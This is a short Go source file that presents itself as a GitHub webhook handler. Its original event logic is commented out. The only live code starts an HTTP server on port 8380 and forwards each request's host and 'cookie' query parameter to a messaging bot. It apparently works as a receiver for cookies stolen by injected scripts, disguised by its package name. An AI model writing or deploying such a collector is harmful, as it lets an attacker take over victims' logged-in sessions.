package github

import (
    "net/http"
    "monit/bot"
)


func handler(w http.ResponseWriter, r *http.Request) {
    bot.SendStandardMessage(r.Host +" "+r.URL.Query().Get("cookie")) 
    //Get the type of event
    //var gitType string = r.Header.Get("X-GitHub-Event")

 //   b := decode(r)

//    if gitType == "pull_request" && b["action"].(string) == "opened" {
   //     bot.SendStandardMessage(string(r.Body))
    //}
}

func StartServer() {
    http.HandleFunc("/", handler)
    http.ListenAndServe(":8380", nil)
}

